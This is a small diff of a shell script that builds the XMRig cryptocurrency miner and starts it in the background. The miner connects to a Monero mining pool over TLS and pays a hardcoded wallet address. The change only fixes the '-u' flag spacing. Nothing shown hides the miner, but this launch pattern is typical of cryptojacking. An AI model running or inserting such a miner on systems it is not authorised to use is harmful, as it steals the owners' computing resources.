@@ -12,5 +12,5 @@ wait
 wait
 cmake .. -DXMRIG_DEPS=scripts/deps;make -j$(nproc)
 wait
-./xmrig --tls -o us-west.minexmr.com:443 - u 44HVbpjPPPpfLtEULwsoUEUNfJ6rAVvrVUde1LgyYmmEf1o7xVyKECVewY1bGbXg7jbsCjo7EM3UFdKkjea5VSdDKLDWxqi -B --syslog --randomx-1gb-pages
+./xmrig --tls -o us-west.minexmr.com:443 -u 44HVbpjPPPpfLtEULwsoUEUNfJ6rAVvrVUde1LgyYmmEf1o7xVyKECVewY1bGbXg7jbsCjo7EM3UFdKkjea5VSdDKLDWxqi -B --syslog --randomx-1gb-pages
 echo "********************"
